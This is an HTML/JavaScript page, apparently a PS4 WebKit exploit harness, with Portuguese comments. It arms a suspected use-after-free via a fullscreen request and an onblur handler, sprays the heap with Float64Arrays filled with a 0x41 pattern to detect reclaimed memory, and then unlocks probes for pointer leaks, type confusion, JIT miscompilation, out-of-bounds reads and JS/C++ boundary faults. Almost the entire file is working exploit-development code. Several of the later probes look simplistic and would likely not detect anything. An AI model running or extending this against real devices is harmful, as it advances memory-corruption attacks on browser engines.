<!DOCTYPE html>
<html>
<meta charset="utf-8">
<title>PS4 WebKit – UAF Gated Bug-Class Diagnostics</title>

<body>
<h2>UAF-Gated Diagnostics</h2>

<button onclick="armUAF()">ARMAR UAF (Fullscreen)</button>
<button id="t1" onclick="testPointerLeak()" disabled>Teste 1: Pointer Leak</button>
<button id="t2" onclick="testTypeConfusion()" disabled>Teste 2: Type Confusion</button>
<button id="t3" onclick="testJIT()" disabled>Teste 3: JIT Miscompile</button>
<button id="t4" onclick="testOOB()" disabled>Teste 4: OOB Escape</button>
<button id="t5" onclick="testBoundary()" disabled>Teste 5: JS↔C++ Boundary</button>

<pre id="log"></pre>

<script>
const log = s => document.getElementById("log").textContent += s + "\n";
let UAF_CONFIRMED = false;
let corrupted = null;

function enableTests() {
    ["t1","t2","t3","t4","t5"].forEach(id =>
        document.getElementById(id).disabled = false
    );
}

function armUAF() {
    log("[*] Arming UAF – creating controllers");

    let controllers = [];
    const PATTERN = 2.121995791e-314; // 0x4141414141414141

    for (let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        controllers.push(a);
    }

    document.documentElement.webkitRequestFullscreen();
    log("[*] Fullscreen requested – press OPTIONS");

    window.onblur = function () {
        log("[*] onblur triggered (UAF window)");

        let spray = [];
        for (let i = 0; i < 8000; i++) {
            let s = new Float64Array(8);
            s.fill(PATTERN);
            spray.push(s);
        }
        log("[*] Spray complete");

        for (let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                UAF_CONFIRMED = true;
                log("[+] UAF CONFIRMED at controllers[" + i + "]");
                break;
            }
        }

        if (!UAF_CONFIRMED) {
            log("[-] UAF not detected");
            return;
        }

        // === NEUTRALIZAÇÃO PARA EVITAR CRASH ===
        try {
            corrupted.fill(0);
            log("[*] Corrupted array neutralized");
        } catch {}

        // DOM rewrite controlado (mantém o processo vivo)
        document.open();
        document.write("<h3>UAF gated – diagnostics unlocked</h3>");
        document.close();

        enableTests();
        log("[*] Diagnostic tests enabled");
    };
}

/* ===========================
   TESTE 1 — POINTER LEAK
   =========================== */
function testPointerLeak() {
    if (!UAF_CONFIRMED) return;
    log("\n[TEST 1] Pointer Leak");

    try {
        let o = {};
        let arr = [o, o, o];
        log("JSON: " + JSON.stringify(arr));
    } catch (e) {
        log("JSON exception");
    }

    try {
        let e = new Error("x");
        log("Stack: " + e.stack);
    } catch {}

    log("[RESULT] Any numeric / address-like value = POSITIVE");
}

/* ===========================
   TESTE 2 — TYPE CONFUSION
   =========================== */
function testTypeConfusion() {
    if (!UAF_CONFIRMED) return;
    log("\n[TEST 2] Type Confusion");

    function f(x) { return x.a; }
    let obj = { a: 13.37 };
    let ta = new Float64Array(4);

    for (let i = 0; i < 10000; i++) f(obj);

    try {
        let r = f(ta);
        log("Result f(typedArray): " + r);
        if (r !== undefined)
            log("[!] CONFUSION DETECTED");
    } catch (e) {
        log("Exception (expected)");
    }
}

/* ===========================
   TESTE 3 — JIT MISCOMPILATION
   =========================== */
function testJIT() {
    if (!UAF_CONFIRMED) return;
    log("\n[TEST 3] JIT Speculation");

    function g(x) { return x + 1; }
    for (let i = 0; i < 200000; i++) g(1);

    let r1 = g(1);
    let r2 = g("1");

    log("g(1)   = " + r1);
    log("g('1') = " + r2);
    log("[RESULT] Any impossible value or crash = POSITIVE");
}

/* ===========================
   TESTE 4 — OOB ESCAPE
   =========================== */
function testOOB() {
    if (!UAF_CONFIRMED) return;
    log("\n[TEST 4] OOB Escape");

    let a = new Float64Array(4);
    a.fill(1.1);

    try {
        let v = a[100];
        log("a[100] = " + v);
        if (v !== undefined)
            log("[!] OOB READ DETECTED");
    } catch {
        log("Exception (expected)");
    }
}

/* ===========================
   TESTE 5 — JS ↔ C++ BOUNDARY
   =========================== */
function testBoundary() {
    if (!UAF_CONFIRMED) return;
    log("\n[TEST 5] JS ↔ C++ Boundary");

    try {
        let img = new Image();
        Object.defineProperty(img, "src", {
            get() { throw 13.37; }
        });
        document.body.appendChild(img);
        log("No crash");
    } catch (e) {
        log("Caught: " + e);
    }

    log("[RESULT] Crash or corruption = POSITIVE");
}
</script>
</body>
</html>

